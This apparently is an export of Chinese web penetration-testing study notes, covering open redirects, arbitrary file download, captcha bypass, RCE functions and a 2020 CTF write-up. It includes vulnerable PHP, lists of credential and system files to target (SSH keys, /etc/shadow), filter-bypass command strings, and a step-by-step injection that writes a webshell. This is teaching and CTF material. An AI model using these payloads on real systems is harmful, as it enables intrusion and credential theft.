      <link href="/2020/08/26/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/"/>
      <url>/2020/08/26/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12%E3%80%81%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h2><h3 id="一、不安全的URL跳转漏洞概要"><a href="#一、不安全的URL跳转漏洞概要" class="headerlink" title="一、不安全的URL跳转漏洞概要"></a>一、不安全的URL跳转漏洞概要</h3><p>服务端未对传入的跳转url变量进行检查和控制，导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易。</p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200826124821200.png" alt="image-20200826124821200"></p><h3 id="二、频发业务场景"><a href="#二、频发业务场景" class="headerlink" title="二、频发业务场景"></a>二、频发业务场景</h3><p>1.登陆跳转最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</p><p>2.用户分享、收藏内容过后，会跳转<br>3.跨站点认证、授权后，会跳转<br>4.站内点击其它网址链接时，会跳转</p><p>5.在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</p><p>6.业务完成后跳转这可以归结为一类跳转。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件下载漏洞</title>
      <link href="/2020/08/25/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/25/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h2><h3 id="一、任意文件下载漏洞概要"><a href="#一、任意文件下载漏洞概要" class="headerlink" title="一、任意文件下载漏洞概要"></a>一、任意文件下载漏洞概要</h3><p>由于业务需求，网站提供文件查看或下载功能，如果对用户查看或下载的文件不做限制，则恶意用户能够查看或下载任意文件，可以是源代码、敏感文件等。攻击者可以读取下载服务器中的配置文件、敏感文件等，会提供攻击者更多可用信息，提高被入侵的风险。</p><h3 id="二、任意文件下载漏洞利用条件"><a href="#二、任意文件下载漏洞利用条件" class="headerlink" title="二、任意文件下载漏洞利用条件"></a>二、任意文件下载漏洞利用条件</h3><ul><li><p>存在读文件的函数</p></li><li><p>读取文件的路径用户可控且未校验或校验不严</p></li><li><p>输出了文件内容</p></li></ul><h3 id="三、任意文件下载漏洞案例"><a href="#三、任意文件下载漏洞案例" class="headerlink" title="三、任意文件下载漏洞案例"></a>三、任意文件下载漏洞案例</h3><h4 id="1、PHP源码中的问题"><a href="#1、PHP源码中的问题" class="headerlink" title="1、PHP源码中的问题"></a>1、PHP源码中的问题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($filename); </span><br><span class="line">header(<span class="string">&#x27;Content-Type: imgage/jpeg&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>.$filename);</span><br><span class="line">header(<span class="string">&#x27;Content-Lengh: &#x27;</span>.filesize($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2、超链接"><a href="#2、超链接" class="headerlink" title="2、超链接"></a>2、超链接</h4><p>网站URL中存在下载参数，并且未进行过滤../../字符，且输出了文件内容。</p><p>从链接上看，形如：</p><ul><li><p>download.php?path=</p></li><li><p>download.php?file= </p></li><li><p>down.php?file=</p></li><li><p>data.php?file= </p></li><li><p>readfile.php?file= </p></li><li><p>read.php?filename=</p></li></ul><p><strong>利用Hacker语法查找相关url链接：</strong><code>inurl:&quot;readfile.php?file=&quot;</code></p><h4 id="3、数据包参数"><a href="#3、数据包参数" class="headerlink" title="3、数据包参数"></a>3、数据包参数</h4><p>从数据包里的参数名看，形如：</p><ul><li><p>FilePath= </p></li><li><p>fifilepath= </p></li><li><p>path=</p></li><li><p>inputFile= </p></li><li><p>url= </p></li><li><p>data=</p></li><li><p>readfifile= </p></li><li><p>src=</p></li></ul><h3 id="四、任意文件下载漏洞的利用"><a href="#四、任意文件下载漏洞的利用" class="headerlink" title="四、任意文件下载漏洞的利用"></a>四、任意文件下载漏洞的利用</h3><h4 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h4><p>1、下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p><p>2、下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前人后门。</p><p>3、下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。</p><h4 id="不同操作系统的思路"><a href="#不同操作系统的思路" class="headerlink" title="不同操作系统的思路"></a>不同操作系统的思路</h4><p>1、Windows</p><blockquote><p>C:\boot.ini//查看系统版本<br>C:\Windows\repair\sam//存储系统初次安装的密码<br>C:\Program Files\mysqlmy.ini//Mysql配置<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini//Mysql配置信息<br>C:\Windows\System32\inetsrvMetaBase.xml//1S配置文件<br>C:\VProgram Files\mysqNdata\mysql\user.MYD//Mysql root<br>C:\Windows\win.ini//Windows系统的一个基本系统配置文件</p></blockquote><p>2、Linux</p><blockquote><p>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>/root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts//记录每个访问计算机用户的公钥<br>/etc/passwd@/etc/shadow<br>/etc/my.cnf//mysql配置文件<br>/etc/httpd/conf/httpd.conf//apache配置文件<br>/root/.bash_history//用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/porc/config.gz//内核配置文件</p></blockquote><p><strong>附加：</strong>Linux下root可以下载/var/lib/mlocate/mlocate.db数据库，通过 <code>locate mlocate.db root</code>命令可以获得所有root的文件列表。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解</title>
      <link href="/2020/08/25/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2020/08/25/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="一、暴力破解工具"><a href="#一、暴力破解工具" class="headerlink" title="一、暴力破解工具"></a>一、暴力破解工具</h3><p>1、Kali：<strong>Hydra</strong></p><p><a href="https://imgchr.com/i/dcdWhn"><img src="https://s1.ax1x.com/2020/08/25/dcdWhn.png" alt="dcdWhn.png"></a></p><h3 id="二、验证码-CATPTCHA-Completely-Automated-Public-Turing-test-to-tell-Computers-and-Humans-Apart"><a href="#二、验证码-CATPTCHA-Completely-Automated-Public-Turing-test-to-tell-Computers-and-Humans-Apart" class="headerlink" title="二、验证码(CATPTCHA, Completely Automated Public Turing test to tell Computers and Humans Apart)"></a>二、验证码(CATPTCHA, Completely Automated Public Turing test to tell Computers and Humans Apart)</h3><h4 id="1、验证码常见问题："><a href="#1、验证码常见问题：" class="headerlink" title="1、验证码常见问题："></a>1、验证码常见问题：</h4><p>1）验证码在后台长时间不过期；2）验证码设计不符合逻辑产生逻辑漏洞；3）验证码设计的过于简单并且有规律</p><h3 id="三、验证码绕过方式"><a href="#三、验证码绕过方式" class="headerlink" title="三、验证码绕过方式"></a>三、验证码绕过方式</h3><p>1、前端验证：直接删除JS事件</p><p>2、后端验证但长期有效：抓住请求的报文，防止重定向刷新Session中的验证码。然后在BP中通过repeater模块暴力破解。</p><p>3、后端验证且一次性Token：可以使用BP中的Token宏模块自动获得每次请求刷新的Token，依然用BP的repeater模块进行暴力破解。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020CTF强网杯记录</title>
      <link href="/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2020CTF%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2020CTF%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="2020CTF强网杯记录"><a href="#2020CTF强网杯记录" class="headerlink" title="2020CTF强网杯记录"></a>2020CTF强网杯记录</h2><h3 id="1、fun-hash"><a href="#1、fun-hash" class="headerlink" title="1、fun_hash"></a>1、fun_hash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;hash2&#x27;</span>] === $_GET[<span class="string">&#x27;hash3&#x27;</span>] || md5($_GET[<span class="string">&#x27;hash2&#x27;</span>]) !== md5($_GET[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5($_GET[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>Payload</strong>：<code>http://39.101.177.96/?hash1=0e5882628476&amp;hash2[]=3&amp;hash3[]=4&amp;hash4=ffifdyop</code></p><p><strong>第一关</strong>：需要绕过这个判断式，这里通过hash碰撞脚本撞出来，绕过方式是利用的是php的弱类型变量特点，0e开头且后面所有内容都是数字的字符串会用科学计数法的方式来看，因此认为值是0。所以过第一关只需要碰撞出0eXXX的原字符串经过md4加密仍然是0eXXX的密文即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;0e&#x27;</span></span><br><span class="line">        rnds += <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md4 = hashlib.new(<span class="string">&#x27;md4&#x27;</span>, rnds)</span><br><span class="line">        value = md4.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start+str_len] == substr <span class="keyword">and</span> if_havechar(value[start+str_len:]):</span><br><span class="line">            <span class="keyword">print</span> rnds</span><br><span class="line">            <span class="comment">#stop_event.set()</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment">#print rnds + &quot;=&gt;&quot; + value + &quot;\n&quot;</span></span><br><span class="line">            <span class="comment">#碰撞双md5</span></span><br><span class="line">           <span class="comment">#md4 = hashlib.new(&#x27;md4&#x27;,value)</span></span><br><span class="line">           <span class="comment"># if md4.hexdigest()[start: start+str_len] == substr and if_havechar(md4.hexdigest()[start+str_len:]):</span></span><br><span class="line">            <span class="comment">#    print rnds+ &#x27;=&gt;&#x27; + value+&#x27;=&gt;&#x27;+ md4.hexdigest()  + &#x27;\n&#x27;</span></span><br><span class="line">             <span class="comment">#   stop_event.set()</span></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">if_havechar</span>(<span class="params">str_list</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str_list)):</span><br><span class="line">        <span class="keyword">if</span> (str_list[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> str_list[i] &lt;= <span class="string">&#x27;z&#x27;</span>) <span class="keyword">or</span> (str_list[i] &gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> str_list[i] &lt;=<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = int(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p><strong>第二关：</strong>hash2和hash3不同，但是他们md5加密后要相同，这里因为判断是用的全等判断，所以不能利用php弱类型的特点去进行绕过了，这里因为md5()函数的特点，md5函数不能处理参数是数组的情况，如果参数是数组会返回null，因此构造两个不同的数组分别作为输入就会得到两个null，就绕过了第二关</p><p><strong>第三关：</strong>第3关依然考察hash加密并且加入了sql注入的知识点，<code>SELECT * FROM flag WHERE password = &#39;md5($_GET[&quot;hash4&quot;],true)&#39;</code>，从查询使用的SQL语句可以看出，md5函数的第二个参数是True，这意味着加密后的MD5结果是以二进制的形式输出，那么就可以爆破一个md5结果是可以绕过判断的字符串。如果像绕过判断就需要构造一个MD5值是<code>&#39;or&#39;真</code>，这里参考一下<a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/%EF%BC%8Cpayload%60">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/，payload`</a> ffifdyop`</p><h3 id="2、Upload"><a href="#2、Upload" class="headerlink" title="2、Upload"></a>2、Upload</h3><p>给的是一个data.pcapng文件，放入WireShark进行流量分析，发现就是通过一个表单上传一张图片而已，通过WireShark将图片的数据流导出为JPEG（根据数据中图片的格式），其次是流量中有POST时有表单的注释，提示是使用steghide隐写工具，将隐藏内容提取出来，并且用了一个good password加密了。</p><p><a href="https://imgchr.com/i/dDMSo9"><img src="https://s1.ax1x.com/2020/08/24/dDMSo9.png" alt="dDMSo9.png"></a></p><p>去Kali里面直接进行Steghide工具的解密：<code>steghide extract -sf XX.jpg -p 123456</code>，没想到密码就是123456，没有经过爆破就得到了flag。参考下面博客。</p><p><a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571">https://blog.csdn.net/Blood_Seeker/article/details/81837571</a></p><p><a href="https://imgchr.com/i/dDKxZ4"><img src="https://s1.ax1x.com/2020/08/24/dDKxZ4.png" alt="dDKxZ4.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> CTF笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF绕过技巧</title>
      <link href="/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CTF%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
      <url>/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CTF%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="CTF绕过技巧"><a href="#CTF绕过技巧" class="headerlink" title="CTF绕过技巧"></a>CTF绕过技巧</h2><h3 id="WebShell命令屏蔽的绕过"><a href="#WebShell命令屏蔽的绕过" class="headerlink" title="WebShell命令屏蔽的绕过"></a>WebShell命令屏蔽的绕过</h3><p>当cat被屏蔽时可以使用c`1`at flag.php</p><p>当空格被过滤时：</p><p>cat&lt;flag.php    #利用重定向符</p><p>cat$IFS’flag.php’、cat${IFS}’flag.php’    #利用shell的IFS变量</p><p>cat%09’flag.php’    #代替url上的空格</p><p>a=l;b=s;$a$b    #shell变量拼接</p><p>echo “whoami” | base64、`echo “base64结果”| base64 -d`    #通过base64编码后解码命令执行</p>]]></content>
      
      
      <categories>
          
          <category> CTF笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程命令执行RCE</title>
      <link href="/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9%E3%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE/"/>
      <url>/2020/08/24/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9%E3%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE/</url>
      
        <content type="html"><![CDATA[<h2 id="远程命令执行RCE"><a href="#远程命令执行RCE" class="headerlink" title="远程命令执行RCE"></a>远程命令执行RCE</h2><h3 id="一、代码注入"><a href="#一、代码注入" class="headerlink" title="一、代码注入"></a>一、代码注入</h3><blockquote><p>控制PHP代码</p></blockquote><h4 id="直接执行代码函数："><a href="#直接执行代码函数：" class="headerlink" title="直接执行代码函数："></a>直接执行代码函数：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(mixed $arg);    <span class="comment">#当作php代码执行(需要有分号)</span></span><br><span class="line">assert(mixed $arg);    <span class="comment">#如果$arg是字符串，当作php代码执行(分号有无皆可)</span></span><br><span class="line">$&#123;php代码&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="间接："><a href="#间接：" class="headerlink" title="间接："></a>间接：</h4><h5 id="1、call-user-func（）——调用回调函数"><a href="#1、call-user-func（）——调用回调函数" class="headerlink" title="1、call_user_func（）——调用回调函数"></a>1、call_user_func（）——调用回调函数</h5><p>mixed call_user_func(callable $callback [, mixed $paramter…]) #回调函数，第一个参数函数，第二个参数函数的参数is_callable(‘’)测试是否可以作为回调函数，system、assert允许</p><h5 id="2、array-map"><a href="#2、array-map" class="headerlink" title="2、array_map()"></a>2、array_map()</h5><p>   <strong>array_map</strong>    ( <a href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> <code>$callback</code>   , array <code>$array1</code>   [, array <code>$...</code>  ] ) : array</p><p>和1、差不多，但是传入的参数是数组方式，数组里的每一个元素都要传入的回调函数里执行。回调函数有几个参数，就要传几个数组，每个数组对应每个函数的参数进行传参。</p><h5 id="3、create-function-——创建匿名函数"><a href="#3、create-function-——创建匿名函数" class="headerlink" title="3、create_function() ——创建匿名函数"></a>3、create_function() ——创建匿名函数</h5><p>create_function(string $args, string $code)    #创建一个匿名函数</p><h5 id="4、preg-replace-代码执行-——字符串匹配，如-e且匹配成功则执行参数"><a href="#4、preg-replace-代码执行-——字符串匹配，如-e且匹配成功则执行参数" class="headerlink" title="4、preg_replace() 代码执行 ——字符串匹配，如/e且匹配成功则执行参数"></a>4、<code>preg_replace()</code> 代码执行 ——字符串匹配，如/e且匹配成功则执行参数</h5><p>preg_replace(<code>&quot;/test/e&quot;</code>,<code>$_GET</code>[<code>&quot;h&quot;</code>],<code>&quot;jutst test&quot;</code>);    如果参数1的正则表达匹配到参数3的内容且参数1有/e修饰符，则执行参数2的代码。</p><h5 id="5、preg-match-代码执行"><a href="#5、preg-match-代码执行" class="headerlink" title="5、preg_match 代码执行"></a>5、<code>preg_match</code> 代码执行</h5><h3 id="二、命令注入"><a href="#二、命令注入" class="headerlink" title="二、命令注入"></a>二、命令注入</h3><blockquote><p>执行服务器命令</p></blockquote><p>其它命令执行函数官方文档：<a href="https://www.php.net/manual/zh/ref.exec.php">https://www.php.net/manual/zh/ref.exec.php</a></p><h4 id="1、system"><a href="#1、system" class="headerlink" title="1、system()"></a>1、system()</h4><p>   <strong>system</strong>    ( string <code>$command</code>   [, int <code>&amp;$return_var</code>  ] ) : string</p><p>显示所有结果</p><h4 id="2、exec"><a href="#2、exec" class="headerlink" title="2、exec()"></a>2、exec()</h4><p>   <strong>exec</strong>    ( string <code>$command</code>   [, array <code>&amp;$output</code>   [, int <code>&amp;$return_var</code>  ]] ) : string</p><p>默认返回执行结果的最后一行</p><h4 id="3、shell-exec"><a href="#3、shell-exec" class="headerlink" title="3、shell_exec()"></a>3、shell_exec()</h4><p>   <strong>shell_exec</strong>    ( string <code>$cmd</code>   ) : string</p><p>只返回所有结果，不自动打印返回结果</p><h4 id="4、passthru"><a href="#4、passthru" class="headerlink" title="4、passthru()"></a>4、passthru()</h4><p>   <strong>passthru</strong>    ( string <code>$command</code>   [, int <code>&amp;$return_var</code>  ] ) : void</p><h4 id="5、-运算符"><a href="#5、-运算符" class="headerlink" title="5、``运算符"></a>5、``运算符</h4><p>​    反引号直接执行命令</p><h4 id="6、"><a href="#6、" class="headerlink" title="6、"></a>6、</h4><p><a href="https://imgchr.com/i/dDMYwQ"><img src="https://s1.ax1x.com/2020/08/24/dDMYwQ.png" alt="dDMYwQ.png"></a></p><p><a href="https://imgchr.com/i/dDMaYn"><img src="https://s1.ax1x.com/2020/08/24/dDMaYn.png" alt="dDMaYn.png"></a></p><h3 id="三、绕过命令注入长度的限制"><a href="#三、绕过命令注入长度的限制" class="headerlink" title="三、绕过命令注入长度的限制"></a>三、绕过命令注入长度的限制</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#假设命令限制最长10字节，我们需要想办法在目标服务器中写入一句话木马</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php $_POST[1] &gt;&#x27;</span> | base64    <span class="comment">#对一句话木马进行base64编码</span></span><br><span class="line"><span class="built_in">echo</span> PD9waHAgJF9QT1NUWzFdID4K|base64 -d&gt;1.php    <span class="comment">#对base64解码可以获得一句话</span></span><br><span class="line">w 命令是linux中最短的命令，有助于我们搭配重定向符进行命令切片与组合</span><br><span class="line"><span class="comment">#组成一下Payload，下面的每行Payload作为参数传入到服务器中作为命令执行。</span></span><br><span class="line">*******</span><br><span class="line">w&gt;1.php</span><br><span class="line">w&gt;\ -d\&gt;\\</span><br><span class="line">w&gt;base64\\</span><br><span class="line">w&gt;ID4K\|\\</span><br><span class="line">w&gt;NUWzFd\\</span><br><span class="line">w&gt;JF9QT1\\</span><br><span class="line">w&gt;9waHAg\\</span><br><span class="line">w&gt;o\ PD\\</span><br><span class="line">w&gt;ech\\</span><br><span class="line">ls -t&gt;0    <span class="comment">#ls -t是按照文件创建的时间顺序排序文件名(时间越新越前)，这样就把我们构造的文件名全都排序到了文件名为0的文件中</span></span><br><span class="line">sh 0    <span class="comment">#执行文件0中的内容，成功组成一句话木马并写入到1.php中</span></span><br><span class="line">*******</span><br><span class="line"><span class="comment">#######文件0内容#######</span></span><br><span class="line">0</span><br><span class="line">ech\</span><br><span class="line">o PD\</span><br><span class="line">9waHAg\</span><br><span class="line">JF9QT1\</span><br><span class="line">NUWzFd\</span><br><span class="line">ID4K|\</span><br><span class="line">base64\</span><br><span class="line"> -d&gt;\</span><br><span class="line">1.php</span><br><span class="line"><span 